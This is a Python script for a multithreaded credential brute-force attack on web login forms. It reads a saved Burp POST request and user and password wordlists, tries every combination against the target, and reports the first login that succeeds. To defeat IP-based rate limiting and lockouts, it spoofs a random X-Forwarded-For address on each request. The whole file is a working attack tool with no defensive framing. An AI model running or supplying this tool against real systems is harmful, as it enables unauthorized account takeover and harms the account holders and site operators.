#!/usr/bin/env python3

import sys
import requests
import random
import time
import threading
import queue
import os

class App():

    def __init__(self):
        print("""

Created by

________________________________________________
________________________________________________
  _                             
 / \    |\ |  _  ._   _  ._ _|_ 
 \_/ >< | \| (_) |_) (_) |   |_ 
                 |              
________________________________________________
________________________________________________


    """)
        try:
            self.path_to_request_file = sys.argv[1].strip()
            self.path_to_user_list = sys.argv[2].strip()
            self.path_to_password_list = sys.argv[3].strip()
            self.amount_of_threads = int(sys.argv[4].strip())
        except IndexError:
            print("\nYou have to call the program like that: \n")
            print("\t\033[1m" + "python3 *program* *request* *user_list* *password_list* *amount_of_threads*\n")
            print("\033[0m" + "Recommondation: 10 Threads\nThe rest will be interactive.")
            exit()

    def open_file(self, file_path):
        try:
            file = open(file_path, "r")
            return file
        except FileNotFoundError:
            print("\nThe request file was not found, exiting...")
            exit()

    def read_wordlist(self, file):
            #Read every line and strip them afterwards
            lines_not_stripped = file.readlines()
            lines_stripped = [row.strip() for row in lines_not_stripped]
            return lines_stripped

    def read_and_format_request(self, req):
        #Read the request with new lines
        request = repr(req.read())
        if request == "":
            print("The request file is empty, exiting...")
            exit()
        #Remove the ' at the beginning and end
        request = request[1:len(request)-1]
        return request

    def get_row_content(self, row):
        return self.content_request_file[row - 1]

    def open_read_and_save_file_content(self):
        #Open files
        self.request_file = self.open_file(self.path_to_request_file)
        self.user_list = self.open_file(self.path_to_user_list)
        self.password_list = self.open_file(self.path_to_password_list)

        #Read user and password lists
        self.content_user_list = self.read_wordlist(self.user_list)
        self.content_password_list = self.read_wordlist(self.password_list)

        #Read the request file not stripped
        self.content_request_not_per_line = self.read_and_format_request(self.request_file)
        self.content_request_file = [row for row in self.content_request_not_per_line.split('\\n')]
    
    def checking_for_invalid_http_method(self):
        if not self.content_request_file[0].startswith("POST"):
            print("The request method must be POST")
            exit()

    def headers_end_at(self):
        row = 0
        for x in self.content_request_file:
            if x == "":
                return row
            row+=1

    def pull_headers_into_dict(self):
        self.headers = {}
        for x in range(1, self.headers_end_at()):
            self.headers[self.content_request_file[x].split(":", 1)[0]] = self.content_request_file[x].split(":", 1)[1].split(" ", 1)[1]

    def pull_and_format_data_to_be_sent(self):
        try:
            self.keyandvalue = {}  ####WARNING, I NEED TO CHECK THIS PART
            for row in range(self.headers_end_at()+1, len(self.content_request_file)-1):
                for x in range(self.content_request_file[row].count("&")+1):
                    self.keyandvalue[self.content_request_file[row].split("&")[x].split("=")[0]] = self.content_request_file[row].split("&")[x].split("=")[1]
        except IndexError:
            print("You probably have some empty lines at the bottom of your request.\n")
            print("Make sure to use the \"save request\" option inside burp")

    def ask_user_for_more_data(self):
        


        ###########################
        #Ask for username argument#
        ###########################
        print("\nChoose the argument for the username OR email BY NUMBER:\n")
        tempListUser = []
        for x in self.keyandvalue:
            tempListUser.append(x)
        i = 1
        #print(tempListUser)

        for x in tempListUser:
            print(f"[{i}] {x}")
            i = i + 1
        try:
            user_input = int(input("> "))
        except ValueError:
            print("\nERROR: Enter a number next time")
            exit()
        
        if user_input>len(self.keyandvalue) or user_input == "" or user_input < 1:
            print("1. Couldn't find that argument\n2. You chose the same argument both times, exiting...")
            exit()
        try:
            self.username_argument = tempListUser[user_input-1]
        except IndexError:
            print(tempListUser)

        ###########################
        #Ask for password argument#
        ###########################

        print("\n=================================================================\n")
        print("Choose the argument for the password BY NUMBER:\n")
        
        ii = 1
        for x in tempListUser:
            print(f"[{ii}] {x}")
            ii = ii + 1
        try:
            password_input = int(input("> "))
        except ValueError:
            print("ERROR: Enter a number next time")
            exit()
        if password_input>len(self.keyandvalue) or password_input == "" or password_input < 1 or password_input == user_input:
            print("1. Couldn't find that argument\n2. You chose the same argument both times, exiting...")
            exit()
        self.password_argument = tempListUser[password_input-1]

        ###########################
        ### Invalid Credentials ###
        ###########################

        print("\n=================================================================\n")
        print("Now enter a text that you ONLY get when you enter invalid credentials:\n")
        self.invalid_credentials_output = input("> ")

        ###########################
        ###### SSL Encryption #####
        ###########################

        self.ssl_encryption = None
        print("\n=================================================================\n")
        print("Does it use SSL encryption?\n")
        print("[1] yes\n[2] no")
        temp3 = int(input("> "))
        if temp3 == 1:
            self.ssl_encryption = True
        elif temp3 == 2:
            self.ssl_encryption = False
        else:
            print("That was not an option, exiting...")
            exit()
        print("\n=================================================================\n")

    def concatenate_url(self):
        partone = self.headers["Host"]
        temp = self.content_request_file[0][5::]
        parttwo = temp.split(' ')[0]
        self.url = partone + parttwo
        if self.ssl_encryption == True:
            self.url = "https://" + self.url
        else:
            self.url = "http://" + self.url
        if self.url == "":
            print("You don't have a HOST header set. Please set it and retry.")
            exit()

    def create_queue(self):
        self.username_queue = queue.Queue()
        self.password_queue = queue.Queue()

        amount_of_rows_pass_file = len(self.content_password_list)
        amount_of_rows_pass_user = len(self.content_user_list)

        print("##################################################")
        print(f"Loading username and password file {(amount_of_rows_pass_file+amount_of_rows_pass_user)} lines")
        print("##################################################\n")

        for username in self.content_user_list:
            for password in self.content_password_list:
                self.username_queue.put(username)

        for username in self.content_user_list:
            for password in self.content_password_list:
                self.password_queue.put(password)

        self.queue_list2 = list(self.password_queue.queue)
        #print(f"\n{self.queue_list2}\n")

        self.queue_list = list(self.username_queue.queue)
        #print(f"\n{self.queue_list}\n")


    def brute_force(self):
        for i in range(len(self.queue_list)+1):
            data = {}
            for x in self.keyandvalue:
                if x.split('=')[0] == self.username_argument:
                    data[self.username_argument] = self.username_queue.get().strip()
                elif x.split('=')[0] == self.password_argument:
                    data[self.password_argument] = self.password_queue.get().strip()
                else:
                    data[x.split('=')[0]] = x.split('=')[1]
            ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
            self.headers['X-Forwarded-For'] = ip
            response = requests.post(self.url, headers=self.headers, data=data)
            time.sleep(1)
            if str(self.invalid_credentials_output) in str(response.content):
                print(f"[-] Username: \"{data[self.username_argument]}\" & Password:\"{data[self.password_argument]}\"")
            else:
                print("\n\n(One) Password Found:\n")
                print(f"[+] Username: \"{data[self.username_argument]}\" & Password:\"{data[self.password_argument]}\"\n")
                os._exit(0)

    def create_threads(self):
        self.threads = []
        for x in range(self.amount_of_threads):
            thread = threading.Thread(target=self.brute_force)
            self.threads.append(thread)

        for thread in self.threads:
            thread.start()
            time.sleep(0.1)

    def close_file(self, file):
        file.close()
        
    def close_files(self):
        self.close_file(self.request_file)
        self.close_file(self.user_list)
        self.close_file(self.password_list)

    def start(self):
        self.open_read_and_save_file_content()
        self.checking_for_invalid_http_method()
        self.pull_headers_into_dict()
        self.pull_and_format_data_to_be_sent()
        self.ask_user_for_more_data()
        self.concatenate_url()
        self.close_files()
        self.create_queue()
        self.create_threads()


if __name__ == "__main__":
    app = App()
    app.start()

